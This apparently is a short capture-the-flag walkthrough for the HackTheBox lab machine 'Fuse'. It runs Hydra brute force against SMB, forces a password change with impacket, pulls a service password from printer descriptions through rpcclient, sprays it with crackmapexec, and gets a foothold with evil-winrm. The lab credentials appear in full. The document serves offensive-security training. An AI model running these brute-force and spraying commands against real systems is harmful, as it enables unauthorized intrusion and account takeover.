## Brute Force
#### Cewl to get a pwd dictionary
It may take a minute or so
```bash
❯ cewl --with-numbers http://fuse.fabricorp.local/papercut/logs/html/index.htm -w cewl3.txt  
CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```


#### Hydra
It may take two or three minutes
```bash
❯ cat users.txt  
pmerton  
tlavel   
❯ export IP=10.129.2.5           
❯ hydra -L users.txt -P cewl3.txt $IP smb
[445][smb] host: 10.129.2.5   login: tlavel   password: Fabricorp01
```
## SMB 
#### smbclient
```bash
❯ smbclient -L $IP -U tlavel  
Password for [WORKGROUP\tlavel]:  
session setup failed: NT_STATUS_PASSWORD_MUST_CHANGE
```
#### smbpasswd to update it
```bash
smbpasswd -r $IP -U tlavel <- won't work, use impacket instead

❯ /usr/bin/impacket-smbpasswd -newpass Qwer4321= tlavel:Fabricorp01@$IP  
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation  
  
[!] Password is expired, trying to bind with a null session.  
[*] Password was changed successfully.
```
## RPC enum printers
```bash
❯ rpcclient -U "tlavel" $IP  
Password for [WORKGROUP\tlavel]:  
rpcclient $> enumprinters  
       flags:[0x800000]  
       name:[\\10.129.2.5\HP-MFT01]  
       description:[\\10.129.2.5\HP-MFT01,HP Universal Printing PCL 6,Central (Near IT, scan2docs password: $fab@s3Rv1ce$1)]  
       comment:[]
❯ cat enumdomusers.txt | cut -d "]" -f1 | cut -d "[" -f2
```
#### Optional: crackmapexec build users.list
```
❯ crackmapexec smb $IP -u bhult -p Qwer4321=
```
## Password Spray
* https://github.com/A1vinSmith/OSCP-PWK/blob/master/HackTheBox/Windows/Active%20Directory/Forest/README.md#password-spraying---making-a-target-user-list-htb-academy
```bash
❯ crackmapexec winrm $IP -u users.txt -p '$fab@s3Rv1ce$1'  
SMB         10.129.2.5      5985   FUSE             [*] Windows 10.0 Build 14393 (name:FUSE) (domain:fabricorp.local)  
HTTP        10.129.2.5      5985   FUSE             [*] http://10.129.2.5:5985/wsman  
WINRM       10.129.2.5      5985   FUSE             [-] fabricorp.local\Administrator:$fab@s3Rv1ce$1  
WINRM       10.129.2.5      5985   FUSE             [-] fabricorp.local\Guest:$fab@s3Rv1ce$1  
WINRM       10.129.2.5      5985   FUSE             [-] fabricorp.local\krbtgt:$fab@s3Rv1ce$1  
WINRM       10.129.2.5      5985   FUSE             [-] fabricorp.local\DefaultAccount:$fab@s3Rv1ce$1  
WINRM       10.129.2.5      5985   FUSE             [+] fabricorp.local\svc-print:$fab@s3Rv1ce$1 (Pwn3d!)
```
## Foothold
```bash
❯ evil-winrm -i $IP -u svc-print -p '$fab@s3Rv1ce$1'
```

## Reference
* https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/
* https://www.hackingarticles.in/fuse-hackthebox-walkthrough/
* https://github.com/Kyuu-Ji/htb-write-up/blob/master/fuse/write-up-fuse.md
* https://0xn1ghtr1ngs.github.io/posts/Fuse-HTB/
* https://snowscan.io/htb-writeup-fuse/#
* https://chr0x6eos.github.io/2020/10/31/htb-Fuse.html
